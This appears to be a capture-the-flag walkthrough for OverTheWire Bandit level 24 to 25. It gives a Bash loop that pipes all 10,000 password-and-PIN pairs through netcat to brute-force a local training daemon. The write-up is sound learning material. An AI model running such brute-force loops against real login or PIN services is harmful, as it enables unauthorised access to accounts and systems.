# Bandit Level 24 → Level 25

## 🎯 Goal

A daemon listens on `localhost:30002` and requires the current password plus a 4-digit PIN. Test all PINs from `0000` to `9999`.

## 🛠️ Commands Used

```bash
ssh -p 2220 bandit24@bandit.labs.overthewire.org
nano /tmp/brute.sh
chmod +x /tmp/brute.sh
/tmp/brute.sh
```

## 💻 Solution

The Medium walkthrough uses a Bash loop to generate all 10,000 PINs:

```bash
#!/bin/bash
password=<bandit24-password>
for pin in $(seq -w 0000 9999); do
    echo "$password $pin"
done | nc localhost 30002
```

The script sends each password/PIN pair to the service. A successful response identifies the correct PIN and returns the password for `bandit25`.

## 🧠 Explanation

`seq -w` generates zero-padded numbers. A loop automates the otherwise repetitive 10,000-request task.

## 📚 What I Learned

Brute-force automation in a controlled CTF service, Bash loops, `seq`, and Netcat.

---

## 📖 Detailed Medium Write-up

[Read the complete Medium walkthrough](https://medium.com/@iamkapilsaini/overthewire-bandit-levels-23-33-complete-walkthrough-60fb8573221b)

> This GitHub page is a level-by-level version of my original Medium walkthrough.
